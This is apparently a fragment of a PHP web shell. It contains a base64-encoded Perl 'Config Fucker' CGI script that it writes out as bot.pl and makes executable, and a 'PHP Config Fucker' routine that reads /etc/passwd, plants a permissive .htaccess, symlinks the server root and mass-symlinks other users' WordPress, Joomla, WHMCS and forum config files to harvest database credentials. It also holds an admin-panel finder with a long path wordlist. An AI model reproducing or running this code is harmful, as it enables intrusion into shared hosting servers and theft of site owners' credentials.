Ny8nLiR1c2VyLicvcHVibGljX2h0bWwvd3Avd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdwLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvd3AvYmV0YS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd3AtYmV0YS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2JldGEvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLWJldGEudHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcmVzcy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53cDEzLXByZXNzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvd29yZHByZXNzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13b3JkcHJlc3MudHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93b3JkcHJlc3MvYmV0YS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd29yZHByZXNzLWJldGEudHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXdzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1uZXdzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3L3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1uZXcudHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9nL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvd2ViL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13ZWIudHh0JykgOyANCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2Jsb2dzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1ibG9ncy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvbWUvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLWhvbWUudHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcm90YWwvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXByb3RhbC50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3NpdGUvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+b3JkcHJlc3Mtc2l0ZS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL21haW4vd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLW1haW4udHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC90ZXN0L3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy10ZXN0LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvYmV0YS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtaG9tZS50eHQnKSA7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9qb29tbGEvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1qb29tbGEudHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcm90YWwvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1wcm90YWwudHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9qb28vY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1qb28udHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbXMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1jbXMudHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtc2l0ZS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL21haW4vY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1tYWluLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLW5ld3MudHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXcvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1uZXcudHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtaG9tZS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PlZCdWxsZXRpbi1mb3J1bS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3ZiL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PnZiLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvdmIzL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PnZiMy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2NwYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y3BhbmVsLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvcGFuZWwvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PnBhbmVsLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9zdC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+aG9zdC50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3RpbmcvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmhvc3RpbmcudHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob3N0cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+aG9zdHMudHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnplbmNhcnQudHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvemVuY2FydC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnplbmNhcnQtc2hvcC50eHQnKTsgDQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaG9wL2luY2x1ZGVzL2Rpc3QtY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+aG9wLVpDc2hvcC50eHQnKTsgDQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ta19jb25mLnBocCcsJHBkb21haW4uJ35+Pm1rLXBvcnRhbGUxLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvU2V0dGluZ3MucGhwJywkZG9tYWluLid+fj5zbWYudHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvc21mL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLXNtZi50eHQnKTsgDQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9TZXR0aW5ncy5waHAnLCRkb21haW4uJ35+PnNtZi1mb3J1bS50eHQnKTsgDQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bXMvU2V0dGluZ3MucGhwJywkZG9tYWluLid+fj5zbWYtZm9ydW1zLnR4dCcpOyANCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3VwbG9hZC9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj51cGxvYWQudHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pm1hbGF5LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50ZXMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsZW50cy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudGUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudDIudHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRzdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGllbnQudHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcva29uZWtzaS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PndlYmNvbmZpZy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmYucGhwJywkZG9tYWluLid+fj53ZWJjb25maWcyLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvc3lzdGVtL3Npc3RlbS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYTEudHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvc3lzdGVtL3Npc3RlbS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3NpdGVzL2RlZmF1bHQvc2V0dGluZ3MucGhwJywkZG9tYWluLid+PkRydXBhbC50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2UxMDdfY29uZmlnLnBocCcsJGRvbWFpbi4nfj5lMTA3LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvZGF0YXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfj5TZWRpdGlvLnR4dCcpOyANCn0NCmlmICgkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICdQT1NUJykgew0KICByZWFkKFNURElOLCAkYnVmZmVyLCAkRU5WeydDT05URU5UX0xFTkdUSCd9KTsNCn0gZWxzZSB7DQogICRidWZmZXIgPSAkRU5WeydRVUVSWV9TVFJJTkcnfTsNCn0NCkBwYWlycyA9IHNwbGl0KC8mLywgJGJ1ZmZlcik7DQpmb3JlYWNoICRwYWlyIChAcGFpcnMpIHsNCiAgKCRuYW1lLCAkdmFsdWUpID0gc3BsaXQoLz0vLCAkcGFpcik7DQogICRuYW1lID1+IHRyLysvIC87DQogICRuYW1lID1+IHMvJShbYS1mQS1GMC05XVthLWZBLUYwLTldKS9wYWNrKCJDIiwgaGV4KCQxKSkvZWc7DQogICR2YWx1ZSA9fiB0ci8rLyAvOw0KICAkdmFsdWUgPX4gcy8lKFthLWZBLUYwLTldW2EtZkEtRjAtOV0pL3BhY2soIkMiLCBoZXgoJDEpKS9lZzsNCiAgJEZPUk17JG5hbWV9ID0gJHZhbHVlOw0KfQ0KaWYgKCRGT1JNe3Bhc3N9IGVxICIiKXsNCnByaW50ICcNCjxib2R5IGNsYXNzPSJuZXdTdHlsZTEiIGJnY29sb3I9IiMwMDAwMDAiPg0KPHA+Q29uZmlnIEZ1Y2tlcjwvcD4NCjxwPjxmb250IGNvbG9yPSIjQzBDMEMwIj5bPC9mb250PiBDb2RlZCBCeSA8Zm9udCBjb2xvcj0iI0ZGMDAwMCI+WC0xTjczQ1Q8L2ZvbnQ+PGZvbnQgY29sb3I9IiNDMEMwQzAiPl08L2ZvbnQ+DQo8Zm9ybSBtZXRob2Q9InBvc3QiPg0KPHRleHRhcmVhIG5hbWU9InBhc3MiIHN0eWxlPSJib3JkZXI6MXB4IGRvdHRlZCAjMDBmZjAwOyB3aWR0aDogNTQzcHg7IGhlaWdodDogNDIwcHg7IGJhY2tncm91bmQtY29sb3I6IzBDMEMwQzsgZm9udC1mYW1pbHk6VGFob21hOyBmb250LXNpemU6OHB0OyBjb2xvcjojRkYwMDAwIiAgPjwvdGV4dGFyZWE+PC9wPg0KPHAgYWxpZ249ImNlbnRlciI+DQo8aW5wdXQgbmFtZT0idGFyIiB0eXBlPSJ0ZXh0IiBzdHlsZT0iYm9yZGVyOjFweCBkb3R0ZWQgI0ZGMDAwMDsgd2lkdGg6IDIxMnB4OyBiYWNrZ3JvdW5kLWNvbG9yOiMwQzBDMEM7IGZvbnQtZmFtaWx5OlRhaG9tYTsgZm9udC1zaXplOjhwdDsgY29sb3I6I0ZGMDAwMDsgIiAgLz48L3A+DQo8cCBhbGlnbj0iY2VudGVyIj4NCjxpbnB1dCBuYW1lPSJTdWJtaXQxIiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJHRVQgQ09ORklHICEiIHN0eWxlPSJib3JkZXI6MXB4IGRvdHRlZCAjRkYwMDAwOyB3aWR0aDogOTk7IGZvbnQtZmFtaWx5OlRhaG9tYTsgZm9udC1zaXplOjEwcHQ7IGNvbG9yOiM1OUU4MTc7IHRleHQtdHJhbnNmb3JtOnVwcGVyY2FzZTsgaGVpZ2h0OjIzOyBiYWNrZ3JvdW5kLWNvbG9yOiMwQzBDMEMiIC8+PC9wPg0KPC9mb3JtPic7DQp9ZWxzZXsNCkBsaW5lcyA9PCRGT1JNe3Bhc3N9PjsNCiR5ID0gQGxpbmVzOw0Kb3BlbiAoTVlGSUxFLCAiPnRhci50bXAiKTsNCnByaW50IE1ZRklMRSAidGFyIC1jemYgIi4kRk9STXt0YXJ9LiIudGFyICI7DQpmb3IgKCRrYT0wOyRrYTwkeTska2ErKyl7DQp3aGlsZShAbGluZXNbJGthXSAgPX4gbS8oLio/KTp4Oi9nKXsNCiZsaWwoJDEpOw0KcHJpbnQgTVlGSUxFICQxLiIudHh0ICI7DQpmb3IoJGtkPTE7JGtkPDE4OyRrZCsrKXsNCnByaW50IE1ZRklMRSAkMS4ka2QuIi50eHQgIjsNCn0NCn0NCiB9DQpwcmludCc8Ym9keSBjbGFzcz0ibmV3U3R5bGUxIiBiZ2NvbG9yPSIjMDAwMDAwIj4NCjxwPllvdSBnb3QgaXQhITxicj48YnI+PGJyPjxmb250IGNvbG9yPSIjQzBDMEMwIj5bPC9mb250PiBDb2RlZCBCeSA8Zm9udCBjb2xvcj0iI0ZGMDAwMCI+WC0xTjczQ1Q8L2ZvbnQ+PGZvbnQgY29sb3I9IiNDMEMwQzAiPl08L2ZvbnQ+PC9wPg0KPHA+Jm5ic3A7PC9wPic7DQppZigkRk9STXt0YXJ9IG5lICIiKXsNCm9wZW4oSU5GTywgInRhci50bXAiKTsNCkBsaW5lcyA9PElORk8+IDsNCmNsb3NlKElORk8pOw0Kc3lzdGVtKEBsaW5lcyk7DQpwcmludCc8cD48YSBocmVmPSInLiRGT1JNe3Rhcn0uJy50YXIiPjxmb250IGNvbG9yPSIjMDBGRjAwIj4NCjxzcGFuIHN0eWxlPSJ0ZXh0LWRlY29yYXRpb246IG5vbmUiPkNsaWNrIEhlcmUgVG8gRG93bmxvYWQgVGFyIEZpbGU8L3NwYW4+PC9mb250PjwvYT48L3A+JzsNCn0NCn0NCiBwcmludCINCjwvYm9keT4NCjwvaHRtbD4iOw==";
$file = fopen("bot.pl" ,"w+");
$write = fwrite ($file ,base64_decode($configshell));
fclose($file);
    chmod("bot.pl",0755);
	chmod(".htaccess",0755);
   echo "<iframe src=MCF_config/bot.pl width=97% height=100% frameborder=0></iframe>
   </div>";
}
#==================[ Multi BConfig Fucker ]==================#

if(isset($_POST['phpconfig']))
{
?>
<CENTER><br/><br><b><font color=#00ff00>+--=[ PHP Config Fucker Priv8 ]=--+</font></b><br><br><br>
<form method=post><table class=tabnet ><tr><textarea  style="background:black;outline:none;"  rows=20 cols=85 name=user><?php $users=file("/etc/passwd");
foreach($users as $user){ $str=explode(":",$user); echo $str[0]."\n";} ?></textarea><br><b> Your Folder Config Name : <b/><input class=inputz type=text name=folfig size=40  value="" /><input type=submit class=inputzbut name=su value="Lets Start" /></tr></table></form></CENTER>
<?php
	error_reporting(0);
	echo "<font color=red size=2 face=\"comic sans ms\">";
	if(isset($_POST['su']))
	{
	$folfig = $_POST['folfig']; 
	mkdir($folfig,0777);
	chdir($folfig);
$rr  = " Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any \n OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddHandler txt .php \n AddHandler cgi-script .cgi \n AddHandler cgi-script .pl \n Options Indexes FollowSymLinks \n AddType txt .php \n AddType text/html .shtml \n";
$inj1=".htaccess";
$g = fopen($inj1,'w');
fwrite($g,$rr);
fclose ($g);
$indishell = symlink("/","$folfig/root");
		    $rt="<a href=$folfig/root><font color=white size=3 face=\"comic sans ms\"> OwN3d</font></a>";
        echo "Please check link given below for / folder symlink <br><u>$rt</u>";
		
		$dir=mkdir($folfig,0777);
		$r  = " Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any \n OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddHandler txt .php \n AddHandler cgi-script .cgi \n AddHandler cgi-script .pl \n Options Indexes FollowSymLinks \n AddType txt .php \n AddType text/html .shtml \n";
        $inj =".htaccess";
		$f = fopen($inj,'w');
        fwrite($f,$r);
		fclose($f);
        $consym="<a href=$folfig/><font color=white size=3 face=\"comic sans ms\">configuration files</font></a>";
       	echo "<br>The link given below for configuration file symlink...open it, once processing finish <br><u><font color=red size=2 face=\"comic sans ms\">$consym</font></u>";
       	
       	$usr=explode("\n",$_POST['user']);
       	$configuration=array("wp-config.php","wordpress/wp-config.php","web/wp-config.php","wp/wp-config.php","press/wp-config.php","wordpress/beta/wp-config.php",
		"news/wp-config.php","new/wp-config.php","blogs/wp-config.php","home/wp-config.php","blog/wp-config.php","protal/wp-config.php","site/wp-config.php",
		"main/wp-config.php","test/wp-config.php","wp/beta/wp-config.php","beta/wp-config.php","joomla/configuration.php","protal/configuration.php",
		"joo/configuration.php","cms/configuration.php","site/configuration.php","main/configuration.php","news/configuration.php","new/configuration.php",
		"home/configuration.php","configuration.php","SSI.php","forum/SSI.php","forum/inc/config.php","forum/includes/config.php","upload/includes/config.php",
		"cc/includes/config.php","vb/includes/config.php","vb3/includes/config.php","cpanel/configuration.php","panel/configuration.php","ubmitticket.php",
		"manage/configuration.php","myshop/configuration.php","beta/configuration.php","includes/config.php","lib/config.php","conf_global.php",
		"inc/config.php","incl/config.php","include/db.php","include/config.php","includes/functions.php","includes/dist-configure.php","connect.php",
		"mk_conf.php","config/koneksi.php","system/sistem.php","config.php","Settings.php","settings.php","sites/default/settings.php","smf/Settings.php",
		"forum/Settings.php","forums/Settings.php","host/configuration.php","hosting/configuration.php","hosts/configuration.php","zencart/includes/dist-configure.php",
		"shop/includes/dist-configure.php","whm/configuration.php","whmc/configuration.php","whmcs/configuration.php","whmc/WHM/configuration.php",
		"whm/WHMCS/configuration.php","whm/whmcs/configuration.php","order/configuration.php","support/configuration.php","supports/configuration.php",
		"oscommerce/includes/configure.php","oscommerces/includes/configure.php","shopping/includes/configure.php","sale/includes/configure.php","config.inc.php",
		"amember/config.inc.php","clients/configuration.php","client/configuration.php","clientes/configuration.php","cliente/configuration.php",
		"clientsupport/configuration.php","billing/configuration.php","billings/configuration.php","admin/conf.php","datas/config.php","e107_config.php",
		"sites/default/settings.php","admin/config.php");
		foreach($usr as $uss )
		{
			$us=trim($uss);
						
			foreach($configuration as $c)
			{
			 $rs="/home/".$us."/public_html/".$c;
			 $r="$folfig/".$us." .. ".$c;
			 symlink($rs,$r);
			
		}
			
			}
		
		
		}	
	}
	
	
}
//////////////////////////////////////////////////////////////////////////////

elseif(isset($_GET['x']) && ($_GET['x'] == 'adfin'))
{	@ini_set('output_buffering',0); 
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=adfin" method="post">
<?php
set_time_limit(0);
error_reporting(0);
$list['front'] ="admin
adm
admincp
admcp
cp
modcp
moderatorcp
adminare
admins
cpanel
controlpanel";
$list['end'] = "admin1.php
admin1.html
admin2.php
admin2.html
yonetim.php
yonetim.html
yonetici.php
yonetici.html
ccms/
ccms/login.php
ccms/index.php
maintenance/
webmaster/
adm/
configuration/
configure/
websvn/
admin/
admin/account.php
admin/account.html
admin/index.php
admin/index.html
admin/login.php
admin/login.html
admin/home.php
admin/controlpanel.html
admin/controlpanel.php
admin.php
admin.html
admin/cp.php
admin/cp.html
cp.php
cp.html
administrator/
administrator/index.html
administrator/index.php
administrator/login.html
administrator/login.php
administrator/account.html
administrator/account.php
administrator.php
administrator.html
login.php
login.html
modelsearch/login.php
moderator.php
moderator.html
moderator/login.php
moderator/login.html
moderator/admin.php
moderator/admin.html
moderator/
account.php
account.html
controlpanel/
controlpanel.php
controlpanel.html
admincontrol.php
admincontrol.html
adminpanel.php
adminpanel.html
admin1.asp
admin2.asp
yonetim.asp
yonetici.asp
admin/account.asp
admin/index.asp
admin/login.asp
admin/home.asp
admin/controlpanel.asp
admin.asp
admin/cp.asp
cp.asp
administrator/index.asp
administrator/login.asp
administrator/account.asp
administrator.asp
login.asp
modelsearch/login.asp
moderator.asp
moderator/login.asp
moderator/admin.asp
account.asp
controlpanel.asp
admincontrol.asp
adminpanel.asp
fileadmin/
fileadmin.php
fileadmin.asp
fileadmin.html
administration/
administration.php
administration.html
sysadmin.php
sysadmin.html
phpmyadmin/
myadmin/
sysadmin.asp
sysadmin/
ur-admin.asp
ur-admin.php
ur-admin.html
ur-admin/
Server.php
Server.html
Server.asp
Server/
wp-admin/
administr8.php
administr8.html
administr8/
administr8.asp
webadmin/
webadmin.php
webadmin.asp
webadmin.html
administratie/
admins/
admins.php
admins.asp
admins.html
administrivia/
Database_Administration/
WebAdmin/
useradmin/
sysadmins/
admin1/
system-administration/
administrators/
pgadmin/
directadmin/
staradmin/
ServerAdministrator/
SysAdmin/
administer/
LiveUser_Admin/
sys-admin/
typo3/
panel/
cpanel/
cPanel/
cpanel_file/
platz_login/
rcLogin/
blogindex/
formslogin/
autologin/
support_login/
meta_login/
manuallogin/
simpleLogin/
loginflat/
utility_login/
showlogin/
memlogin/
members/
login-redirect/
sub-login/
wp-login/
login1/
dir-login/
login_db/
xlogin/
smblogin/
customer_login/
UserLogin/
login-us/
acct_login/
admin_area/
bigadmin/
project-admins/
phppgadmin/
pureadmin/
sql-admin/
radmind/
openvpnadmin/
wizmysqladmin/
vadmind/
ezsqliteadmin/
hpwebjetadmin/
newsadmin/
adminpro/
Lotus_Domino_Admin/
bbadmin/
vmailadmin/
Indy_admin/
ccp14admin/
irc-macadmin/
banneradmin/
sshadmin/
phpldapadmin/
macadmin/
administratoraccounts/
admin4_account/
admin4_colon/
radmind-1/
Super-Admin/
AdminTools/
cmsadmin/
SysAdmin2/
globes_admin/
cadmins/
phpSQLiteAdmin/
navSiteAdmin/
server_admin_small/
logo_sysadmin/
server/
database_administration/
power_user/
system_administration/
ss_vms_admin_sm/
adminarea/
bb-admin/
adminLogin/
panel-administracion/
instadmin/
memberadmin/
administratorlogin/
admin/admin.php
admin_area/admin.php
admin_area/login.php
siteadmin/login.php
siteadmin/index.php
siteadmin/login.html
admin/admin.html
admin_area/index.php
bb-admin/index.php
bb-admin/login.php
bb-admin/admin.php
admin_area/login.html
admin_area/index.html
admincp/index.asp
admincp/login.asp
admincp/index.html
webadmin/index.html
webadmin/admin.html
webadmin/login.html
admin/admin_login.html
admin_login.html
panel-administracion/login.html
nsw/admin/login.php
webadmin/login.php
admin/admin_login.php
admin_login.php
admin_area/admin.html
pages/admin/admin-login.php
admin/admin-login.php
admin-login.php
bb-admin/index.html
bb-admin/login.html
bb-admin/admin.html
admin/home.html
pages/admin/admin-login.html
admin/admin-login.html
admin-login.html
admin/adminLogin.html
adminLogin.html
home.html
rcjakar/admin/login.php
adminarea/index.html
adminarea/admin.html
webadmin/index.php
webadmin/admin.php
user.html
modelsearch/login.html
adminarea/login.html
panel-administracion/index.html
panel-administracion/admin.html
modelsearch/index.html
modelsearch/admin.html
admincontrol/login.html
adm/index.html
adm.html
user.php
panel-administracion/login.php
wp-login.php
adminLogin.php
admin/adminLogin.php
home.php
adminarea/index.php
adminarea/admin.php
adminarea/login.php
panel-administracion/index.php
panel-administracion/admin.php
modelsearch/index.php
modelsearch/admin.php
admincontrol/login.php
adm/admloginuser.php
admloginuser.php
admin2/login.php
admin2/index.php
adm/index.php
adm.php
affiliate.php
adm_auth.php
memberadmin.php
administratorlogin.php
admin/admin.asp
admin_area/admin.asp
admin_area/login.asp
admin_area/index.asp
bb-admin/index.asp
bb-admin/login.asp
bb-admin/admin.asp
pages/admin/admin-login.asp
admin/admin-login.asp
admin-login.asp
user.asp
webadmin/index.asp
webadmin/admin.asp
webadmin/login.asp
admin/admin_login.asp
admin_login.asp
panel-administracion/login.asp
adminLogin.asp
admin/adminLogin.asp
home.asp
adminarea/index.asp
adminarea/admin.asp
adminarea/login.asp
panel-administracion/index.asp
panel-administracion/admin.asp
modelsearch/index.asp
modelsearch/admin.asp
admincontrol/login.asp
adm/admloginuser.asp
admloginuser.asp
admin2/login.asp
admin2/index.asp
adm/index.asp
adm.asp
affiliate.asp
adm_auth.asp
memberadmin.asp
administratorlogin.asp
siteadmin/login.asp
siteadmin/index.asp
ADMIN/
paneldecontrol/
login/
cms/
admon/
ADMON/
administrador/
ADMIN/login.php
panelc/
ADMIN/login.html";
function template() {
echo '

<script type="text/javascript">
<!--
function insertcode($text, $place, $replace)
{
    var $this = $text;
    var logbox = document.getElementById($place);
    if($replace == 0)
        document.getElementById($place).innerHTML = logbox.innerHTML+$this;
    else
        document.getElementById($place).innerHTML = $this;
//document.getElementById("helpbox").innerHTML = $this;
}
-->
</script>
<br>
<br>
<h1 class="technique-two">
       


</h1>

<div class="wrapper">
<div class="red">
<div class="tube">
<center><table class="tabnet"><th colspan="2">Admin Finder</th><tr><td>
<form action="" method="post" name="xploit_form">

<tr>
<tr>
	<b><td>URL</td>
	<td><input class="inputz" type="text" name="xploit_url" value="'.$_POST['xploit_url'].'" style="width: 350px;" />
	</td>
</tr><tr>
	<td>404 string</td>
	<td><input class="inputz" type="text" name="xploit_404string" value="'.$_POST['xploit_404string'].'" style="width: 350px;" />
	</td></b>
</tr><br><td>
<span style="float: center;"><input class="inputzbut" type="submit" name="xploit_submit" value=" Start Scan" align="center" />
</span></td></tr>
</form></td></tr>
<br /></table>
</div> <!-- /tube -->
</div> <!-- /red -->
<br />
<div class="green">
<div class="tube" id="rightcol">
Verificat: <span id="verified">0</span> / <span id="total">0</span><br />
<b>Found ones:<br /></b>
</div> <!-- /tube -->
